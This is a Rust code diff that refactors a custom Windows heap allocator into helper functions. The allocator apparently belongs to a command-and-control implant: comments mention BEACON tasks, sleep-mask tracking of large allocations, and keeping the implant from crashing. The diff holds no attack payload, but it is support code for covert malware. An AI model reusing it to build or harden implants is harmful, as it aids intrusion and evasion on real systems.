@@ -268,71 +268,15 @@ unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
                 // For larger alignments, we over-allocate and align manually.
                 let align = layout.align();
                 if align <= 8 {
-                    let ptr = alloc_fn(heap_handle as *mut core::ffi::c_void, 0, size);
-                    if !ptr.is_null() && size > 65536 {
-                        track_large_alloc(ptr as *mut u8, size);
-                    }
-                    return ptr as *mut u8;
+                    return alloc_direct(alloc_fn, heap_handle, size);
                 } else {
-                    // Over-allocate for alignment: size + align + 16. The 16 is
-                    // the 8-byte raw-pointer header plus rounding headroom, so
-                    // the aligned address computed below ALWAYS leaves room for
-                    // the header INSIDE the allocation.
-                    //
-                    // implant-inject-2: the naive round-up
-                    //   aligned_addr = (raw_addr + align - 1) & !(align - 1)
-                    // yields aligned_addr == raw_addr when RtlAllocateHeap
-                    // already returned an aligned block (common for align=16
-                    // under LFH) — the header then lands 8 bytes BEFORE the
-                    // allocation (OOB write, and dealloc's *(ptr - 8) becomes a
-                    // wild free). Rounding `raw_addr + 8` up instead guarantees
-                    // aligned_addr - 8 >= raw_addr ALWAYS. See implant-inject-2
-                    // in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
-                    //
-                    // Saturating add guards against usize overflow on attacker-
-                    // controlled sizes (BEACON task sizes flow through here).
-                    let total = size.saturating_add(align).saturating_add(16);
-                    let raw = alloc_fn(heap_handle as *mut core::ffi::c_void, 0, total);
-                    if raw.is_null() {
-                        return core::ptr::null_mut();
-                    }
-                    let raw_addr = raw as usize;
-                    // Round (raw_addr + 8) up to the next aligned address.
-                    // aligned_addr >= raw_addr + 8, so the header slot at
-                    // aligned_addr - 8 is always at or after the raw pointer.
-                    let aligned_addr = align_with_header(raw_addr, align);
-                    // Unconditionally store the raw pointer 8 bytes below the
-                    // aligned address. The slot lies inside the allocation
-                    // (aligned_addr - 8 >= raw_addr) and doesn't overlap the
-                    // user payload (which starts at aligned_addr and runs for
-                    // `size` bytes); the payload end (aligned_addr + size) is
-                    // <= raw_addr + size + align + 7 < raw_addr + total.
-                    let store = (aligned_addr - 8) as *mut *mut core::ffi::c_void;
-                    core::ptr::write(store, raw);
-                    if total > 65536 {
-                        track_large_alloc(raw as *mut u8, total);
-                    }
-                    return aligned_addr as *mut u8;
+                    return alloc_over_aligned(alloc_fn, heap_handle, size, align);
                 }
             }
         }
 
         // Fallback: bump within the static buffer (before APIs resolved).
-        let aligned = (size + 15) & !15;
-        loop {
-            let cur = FALLBACK_BUF.load(Ordering::Acquire);
-            let nxt = cur + aligned as u64;
-            if nxt > FALLBACK_SIZE as u64 {
-                return core::ptr::null_mut();
-            }
-            if FALLBACK_BUF
-                .compare_exchange_weak(cur, nxt, Ordering::AcqRel, Ordering::Relaxed)
-                .is_ok()
-            {
-                let base = core::ptr::addr_of_mut!(FALLBACK_MEM) as *mut u8;
-                return base.add(cur as usize);
-            }
-        }
+        alloc_fallback_bump(size)
     }
 
     unsafe fn dealloc(&self, ptr: *mut u8, layout: core::alloc::Layout) {
@@ -373,20 +317,7 @@ unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
         let ptr_addr = ptr as usize;
         if ptr_addr >= fb_base && ptr_addr < fb_end {
             // Fallback allocation — can't realloc, do alloc + copy.
-            // Layout::from_size_align can Err on overflow/non-power-of-2 align;
-            // under panic=abort the .unwrap() killed the implant. Fail soft
-            // (return null) — matches GlobalAlloc's documented OOM contract.
-            let new_layout = match core::alloc::Layout::from_size_align(new_size, layout.align()) {
-                Ok(l) => l,
-                Err(_) => return core::ptr::null_mut(),
-            };
-            let new = self.alloc(new_layout);
-            if !new.is_null() {
-                let old_len = (fb_end - ptr_addr).min(layout.size());
-                let copy_len = old_len.min(new_size);
-                core::ptr::copy_nonoverlapping(ptr, new, copy_len);
-            }
-            return new;
+            return realloc_fallback_slot(self, ptr, layout, new_size, fb_end, ptr_addr);
         }
 
         let heap_handle = HEAP_HANDLE.load(Ordering::Acquire);
@@ -408,18 +339,135 @@ unsafe impl core::alloc::GlobalAlloc for NtHeapAllocator {
         }
 
         // Generic fallback: alloc + copy + (skip free since dealloc might work).
-        let new_layout = match core::alloc::Layout::from_size_align(new_size, layout.align()) {
-            Ok(l) => l,
-            Err(_) => return core::ptr::null_mut(),
-        };
-        let new = self.alloc(new_layout);
-        if !new.is_null() {
-            let copy_len = layout.size().min(new_size);
-            core::ptr::copy_nonoverlapping(ptr, new, copy_len);
-            self.dealloc(ptr, layout);
-        }
-        new
+        realloc_alloc_copy_free(self, ptr, layout, new_size)
     }
+}
+
+/// Direct heap allocation for `layout.align() <= 8` — RtlAllocateHeap's native
+/// 8-byte alignment already satisfies the layout. Tracks large (> 64 KiB)
+/// allocations in the slab table for sleep-mask.
+unsafe fn alloc_direct(alloc_fn: RtlAllocateHeap, heap_handle: u64, size: usize) -> *mut u8 {
+    let ptr = alloc_fn(heap_handle as *mut core::ffi::c_void, 0, size);
+    if !ptr.is_null() && size > 65536 {
+        track_large_alloc(ptr as *mut u8, size);
+    }
+    ptr as *mut u8
+}
+
+/// Over-allocate and manually align when `layout.align() > 8`, storing the raw
+/// heap pointer 8 bytes below the aligned address (see implant-inject-2).
+unsafe fn alloc_over_aligned(
+    alloc_fn: RtlAllocateHeap,
+    heap_handle: u64,
+    size: usize,
+    align: usize,
+) -> *mut u8 {
+    // Over-allocate for alignment: size + align + 16. The 16 is
+    // the 8-byte raw-pointer header plus rounding headroom, so
+    // the aligned address computed below ALWAYS leaves room for
+    // the header INSIDE the allocation.
+    //
+    // implant-inject-2: the naive round-up
+    //   aligned_addr = (raw_addr + align - 1) & !(align - 1)
+    // yields aligned_addr == raw_addr when RtlAllocateHeap
+    // already returned an aligned block (common for align=16
+    // under LFH) — the header then lands 8 bytes BEFORE the
+    // allocation (OOB write, and dealloc's *(ptr - 8) becomes a
+    // wild free). Rounding `raw_addr + 8` up instead guarantees
+    // aligned_addr - 8 >= raw_addr ALWAYS. See implant-inject-2
+    // in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
+    //
+    // Saturating add guards against usize overflow on attacker-
+    // controlled sizes (BEACON task sizes flow through here).
+    let total = size.saturating_add(align).saturating_add(16);
+    let raw = alloc_fn(heap_handle as *mut core::ffi::c_void, 0, total);
+    if raw.is_null() {
+        return core::ptr::null_mut();
+    }
+    let raw_addr = raw as usize;
+    // Round (raw_addr + 8) up to the next aligned address.
+    // aligned_addr >= raw_addr + 8, so the header slot at
+    // aligned_addr - 8 is always at or after the raw pointer.
+    let aligned_addr = align_with_header(raw_addr, align);
+    // Unconditionally store the raw pointer 8 bytes below the
+    // aligned address. The slot lies inside the allocation
+    // (aligned_addr - 8 >= raw_addr) and doesn't overlap the
+    // user payload (which starts at aligned_addr and runs for
+    // `size` bytes); the payload end (aligned_addr + size) is
+    // <= raw_addr + size + align + 7 < raw_addr + total.
+    let store = (aligned_addr - 8) as *mut *mut core::ffi::c_void;
+    core::ptr::write(store, raw);
+    if total > 65536 {
+        track_large_alloc(raw as *mut u8, total);
+    }
+    aligned_addr as *mut u8
+}
+
+/// Fallback: bump within the static buffer (before APIs resolved).
+unsafe fn alloc_fallback_bump(size: usize) -> *mut u8 {
+    let aligned = (size + 15) & !15;
+    loop {
+        let cur = FALLBACK_BUF.load(Ordering::Acquire);
+        let nxt = cur + aligned as u64;
+        if nxt > FALLBACK_SIZE as u64 {
+            return core::ptr::null_mut();
+        }
+        if FALLBACK_BUF
+            .compare_exchange_weak(cur, nxt, Ordering::AcqRel, Ordering::Relaxed)
+            .is_ok()
+        {
+            let base = core::ptr::addr_of_mut!(FALLBACK_MEM) as *mut u8;
+            return base.add(cur as usize);
+        }
+    }
+}
+
+/// Fallback-buffer realloc stage: a bump slot can't be reallocated in place,
+/// so allocate a fresh block and copy the overlapping prefix.
+unsafe fn realloc_fallback_slot(
+    allocator: &NtHeapAllocator,
+    ptr: *mut u8,
+    layout: core::alloc::Layout,
+    new_size: usize,
+    fb_end: usize,
+    ptr_addr: usize,
+) -> *mut u8 {
+    // Layout::from_size_align can Err on overflow/non-power-of-2 align;
+    // under panic=abort the .unwrap() killed the implant. Fail soft
+    // (return null) — matches GlobalAlloc's documented OOM contract.
+    let new_layout = match core::alloc::Layout::from_size_align(new_size, layout.align()) {
+        Ok(l) => l,
+        Err(_) => return core::ptr::null_mut(),
+    };
+    let new = core::alloc::GlobalAlloc::alloc(allocator, new_layout);
+    if !new.is_null() {
+        let old_len = (fb_end - ptr_addr).min(layout.size());
+        let copy_len = old_len.min(new_size);
+        core::ptr::copy_nonoverlapping(ptr, new, copy_len);
+    }
+    new
+}
+
+/// Generic realloc fallback: alloc + copy + dealloc. Used when the heap path
+/// is unavailable or the allocation was over-aligned (RtlReAllocateHeap
+/// doesn't know about the alignment padding).
+unsafe fn realloc_alloc_copy_free(
+    allocator: &NtHeapAllocator,
+    ptr: *mut u8,
+    layout: core::alloc::Layout,
+    new_size: usize,
+) -> *mut u8 {
+    let new_layout = match core::alloc::Layout::from_size_align(new_size, layout.align()) {
+        Ok(l) => l,
+        Err(_) => return core::ptr::null_mut(),
+    };
+    let new = core::alloc::GlobalAlloc::alloc(allocator, new_layout);
+    if !new.is_null() {
+        let copy_len = layout.size().min(new_size);
+        core::ptr::copy_nonoverlapping(ptr, new, copy_len);
+        core::alloc::GlobalAlloc::dealloc(allocator, ptr, layout);
+    }
+    new
 }
 
 #[cfg(test)]
